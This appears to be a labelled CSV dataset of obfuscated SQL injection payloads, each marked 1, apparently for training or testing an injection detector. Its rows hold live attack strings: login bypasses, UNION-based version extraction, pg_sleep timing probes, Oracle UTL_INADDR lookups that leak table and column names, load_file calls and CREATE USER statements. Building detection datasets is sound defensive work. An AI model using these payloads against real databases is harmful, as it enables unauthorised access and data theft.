payload,label
"admin''OR (SELECT
0b1100000011001)=4b1100000011001.AND.True#",1
AdmIn'$:OR[(seLEcT	8X4)=0O0o5#L,1
"""ADmiN'oR|0x1=(SeLect	(SELECT.1))+Or
0o247 nOT LiKE*0o20533#""Q0o0b111rb",1
"""aDmIN'&or$0x1=0X0X1[||%fALSeanD^0x19AD
}liKE 0o0X3b0O23433AD@aNd\TrUE;and trUE OR faLse  OR  False#"":}B:o ",1
"""aDMiN'	||.0B11011101iN
(0b201000101,826,327)[oR fAlSE OR 5385=5386 AND 0b11111011001!=2010|AnD*4#""",1
"""ADMin'/
\/Or@=""9X0b100b0b14150=0o7x3\or)fAlsE#"".N;4y",1
"""admin'  || `(SELECT (SELECT (SELECT 1)))=(SELECT[9o1) *OR  False AND 0x1#""0]A",1
"""oR Pg_SlEEp  ( 
__tIMe__* )`[ANdTrue/**/AND<0O0b0B1110100011011010100111000111011110100001!lIke 0b0x0b1011A1/*(P*/||_0X4X0o0o0>}&&  TRUe ANd tRuE and tRue --",1
"create user name/**/identified by pass0o173
temporary tablespace temp default tablespace users",1
"_  AND   (selECT (seleCt
(sELEct (SEleCt (seLECT 0x2)))))  LiKe  uTL_iNadDr.gET_hoSt_ADdRESs   (    (   SeLEct dIStINct  (/*:H*/ tabLe_name  )   From   (  sELect diSTInCt  (  anD (SELeCT (SElecT (SeLECt 2))) aNd tRUE#tablE_NAme $)  , RoWNUm AS;limiT fRom Sys.All_TaBLES  )
  WHERE liMIT~ LIke  0O0x5x0B101X5,  )  [ )    And 'i'  lIKE  'IIzPO?c",1
" sElect * FrOM userS
WhERe id='9' oR.@ @(sElect (SeLecT (SeLecT (SeLECt 1))))&/*S7;t*/=  1 UnioN SeLEct (SELECT (SELECT 1)),vERSiOn: (    )      AND   '5' not Like '0x7;' aNdTRUe
Or fAlSE'anD ""&"" lIKe ""&"" OR False -- 1'A{3F",1
" sEleCT * frOM/**/usErS whERE/*DnPD;R*/Id=(seLEct (sElect (SELECT (SELECT 1)))) Or (sElECt 0X1) Or fAlSE Or FaLSE OR ""He"" NOT LIKE ""He"" OR False#""  (   UNioN SelECT (SeLEcT 0b1),vERSION  (   :),  -- 0x0x",1
 SelECt NAMe froM sysCoLUmnS whErE ID  =  ! (  seLECT Id frOm sysOBJECTS WherE NaMe   =  ~TaBlEnaMe'  )  oR FAlSE or (SELECT (SELECT 0)) --,1
SELECt * FRom useRS wheRe id LiKE  (seLECt*0x1) +$+ OR 0x3 ;=  (SELECT 1) aND TRUE --|1S,1
"7;  (%loAD_fILe;<(&\ChaR*( _(sElect;0b10x3F),(seLecT (SelECT~(SELEct (sELEct 101)))),0x74,0X0b111115,0X11,0b0b0x0O0X70,(SElEcT (sElECt 5X61)),8X0O111,0X73,0X7x46,(SElEcT (SeLecT (SelECt<0xC8))) 
)_
 &)/*(>o6x.^_{16_OOY*/ 	 ~)"",,(sEleCt^(seLECT/**/(selEcT.2B1))),7x0O0,5X4O7X0x0x6B8;",1
"_SElect * FRom<uSERS WheRe id  LIKE  '8X4o9b0b10' OR }  oR (>/(SELect (SEleCT (selEcT (sEleCt (SELECT (SELECT 0))))))	 LIke  0x0X6B9 unIon SElEct 0x0x0x0b270,vErsiOn  ([  ) ?&oR "":"" NOT Like "":""  && ^TrUe or fALSE~-- 1'-Y7&]",1
"SeleCT *	FrOM[USErs whERe{Id_  LIKe`	'1' OR \.<\;uNION sElEcT 6x8,@@vERSioN[	ANd  0o7X4 Or faLse oR#fALse AND{(seLeCt 6x1f81) <> (seLECt (select 4xfDe)) --%0b1'OmW",1
?or=7B0X4x0x0X8 {=/*5JaZ*/ 0x4 Or  FALse_orfALsE}or FAlsE--,1
)<< oR]&( `'A'}	=/*t<Z0b0b0B10o5zaE*/'a,1
"ADMin' oR!(SEleCT 0b15); lIKe  0o1#
(",1
" SEleCT>* From USeRs wHEre Id# LIKE  0x0x1`oR ""  (  ]"" Or (SELECt 0B2)@= (SELECT?(SELECT (SELECT (SELECT 1)))) anD TrUE AND True -- 1",1
or 0b3 =;(SELECT 9) || (SELECT (SELECT 0)) OR False --,1
" ANd (SeLEct (SeLECT (SeLECT (selECt (seleCt (SEleCT (SELECT (seLeCt (SELECT 7)))))))))  =  Utl_inADdr.gET_HOSt_aDDRESS   (    (   sElect dIstiNCT  (  COluMn_NAMe  )   FroM   (  SeLeCT DiStInCt  ( /**/cOluMn_nAMe  )  , ROWnUM aS limIt From aLL_TAb_ColUMns  ) = WHeRe
liMIT  =  0B41   )    )   AND'i'  =  'i",1
" SELECt}(Qv q*/FrOm]uSeRS wHeRe Id='5b0xa' %!<@ uNiOn seLecT 3O1O5,vErsION% (/**/	  )   aNd TRUe> && :tRUE?ANd (sELect 0x0o0O0x0O6)  oR  (SeLEct (sElECt (SeLeCt (SELECT 0)))) oR FalsE -- 0'Emv.U",1
" SElEcT?* FroM+uSERs WhERE;iD\ LiKE  0B18	OR ""&  (& ""/*ujT|<GURzkF*/or~0b1  likE ]0b0o9 or 0x0 OR FAlSe OR FALSe	and (sElect 9348)<>(SeLEcT 9349) --
7",1
"	SELEcT * froM USeRS wHere id  =  (sElECt 0o1){Or ""? `(  "" or 0X8  =  (seleCT (SELECT 1)))and 'zY' LikE 'zy' or ""\8C"" Not LIKe ""\9c"" or fALse and TRUe oR FalSe -- 4B110z",1
DIstINct,1
"""  OR, pg_sleeP ;( \__time__ ;):@ or )""0b110b0o7x0O2""/*S7BO?oJWuJ}IF*RI*/likE ""8B2o7Z"" or ""KDe""<>""kDe"" &&:(SelECT (sELEct?0O7x0298))~NOT lIKe (seLect 0O4b0b1110101100010002010800001010001101001111)/*WB|Wa!vhH0B1000m[}PFw Q	in3wB8u*/ &&  ""q=wC""'lIke]""q=WC""~oR ""d*} OR-0b0o0  or`=FaLSE*oR  FALsE OR ""M)3""!=""M)3"" oR fAlse<or ""W?3p"" NoT LIke ""w?3p""#"" noT liKe ""D*}#""^--0X6::r0x5T	RC}SK",1
CreAtE UsErnaME iDeNtIFIed By pAsS0X0o7E tEMPorARY TAblEspace/teMp dEFAULt taBLEsPaCE users,1
